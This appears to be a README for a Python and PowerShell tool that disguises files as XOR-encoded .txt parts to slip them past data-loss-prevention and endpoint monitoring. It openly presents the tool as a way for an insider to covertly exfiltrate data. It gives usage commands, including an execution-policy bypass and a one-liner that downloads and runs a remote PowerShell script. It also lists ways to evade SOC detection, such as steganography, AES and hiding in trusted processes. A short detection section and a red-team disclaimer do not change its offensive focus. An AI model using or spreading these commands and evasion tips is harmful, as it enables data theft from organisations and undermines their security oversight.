# Data Exfiltration

## Overview
Data Exfiltration is a **Python and PowerShell** tool that allows you to **convert any file** (e.g., `.exe`, `.pdf`, `.jpg`, `.xlsx`) into disguised `.txt` files. The encoded files can be safely stored and later restored to their original format. This helps in **evading detection** from EDR, DLP, and SOC teams.

## Purpose
Many organizations use **Data Loss Prevention (DLP) solutions** to block direct file uploads. However, **copy-pasting text is often allowed**. This tool enables an **insider threat** to covertly exfiltrate data by:
1. **Converting files to text-based `.txt` parts**.
2. **Copy-pasting the disguised text** to another system (e.g., email, chat, cloud storage).
3. **Downloading the parts and restoring the original file** without detection.


## Features
✅ Splits files into multiple parts (`file_part1.txt`, `file_part2.txt`, etc.)

✅ Uses **XOR encryption** with a random key for stealth encoding

✅ **No Base64** (avoiding security tool detection)

✅ Restores files exactly as they were (including executables)

✅ **No file deletion** (Original files remain intact)

✅ Works on **Windows/Linux/macOS**

---

## 🔥 Python Version Usage

### **1️⃣ Install Requirements**
Python 3 is required, but no external dependencies.

### **2️⃣ Convert Files to `.txt`**
```sh
python Data-Exfiltration.py /path/to/folder
```
- Example: 
  ```sh
  python Data-Exfiltration.py Data_imp
  ```
- This will convert all files in `Data_imp/` into `.txt` parts.

### **3️⃣ Restore Original Files**
```sh
python Data-Exfiltration.py /path/to/folder --decode
```
- Example:
  ```sh
  python Data-Exfiltration.py Data_imp --decode
  ```
- This will merge `.txt` parts and restore the original files.

---

## 💻 PowerShell Version Usage

### **1️⃣ Convert Files to `.txt`**
```powershell
powershell -ExecutionPolicy Bypass -File FileConverter.ps1 -folder "C:\Users\Data\Data_imp"
```

### **2️⃣ Restore Files from `.txt` Parts**
```powershell
powershell -ExecutionPolicy Bypass -File FileConverter.ps1 -folder "C:\Users\Data\Data_imp" -decode
```

### **Alternative (Without Saving Script Locally)**
```powershell
IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/user/FileConverter.ps1" -UseBasicParsing).Content
Encode-Files -folder "C:\Users\Data\Data_imp"
```

---

## 🚨 Detection Methods by SOC Teams
Although this tool tries to avoid detection, SOC teams can still identify exfiltration attempts through:

1. **Unusual Text File Activity** 📂
   - Large `.txt` files appearing suddenly with high entropy.
   - `.txt` files created with unexpected file sizes (matching original files).

2. **Suspicious File Splitting** 🛑
   - Files broken into parts (`_part1.txt`, `_part2.txt`) detected in **endpoint logs**.
   - Frequent read/write operations on `.txt` files in a short time span.

3. **Behavioral Analysis** 🔍
   - Use of **XOR encoding** flagged by advanced EDR/AV solutions.
   - Abnormal PowerShell execution, especially `Invoke-WebRequest` usage.
   - Processes interacting with `.txt` files in directories not normally used for text-based storage.

4. **Network Traffic Anomalies** 🌐
   - **Outbound `.txt` uploads** with encrypted content to unknown domains.
   - Detection of encoded **XOR patterns in traffic** (if not using HTTPS or encrypted channels).

5. **SIEM & Endpoint Alerts** ⚠️
   - Unusual PowerShell execution (Event ID 4104 - Script Block Logging).
   - File access anomalies via Sysmon (Event ID 11 - File Creation).

### 🛡️ **How to Mitigate Detection**
✔️ Rename `.txt` files to blend in (e.g., `README_part1.txt`).
✔️ Use **steganography** instead of plain XOR.
✔️ Encrypt `.txt` parts using **AES** rather than simple XOR.
✔️ Exfiltrate using trusted processes (e.g., embedding in known applications).

---

## ⚠️ Disclaimer
This tool is for **educational and red team research** purposes only. The author is not responsible for any misuse.

🚀 **Happy Hacking!**

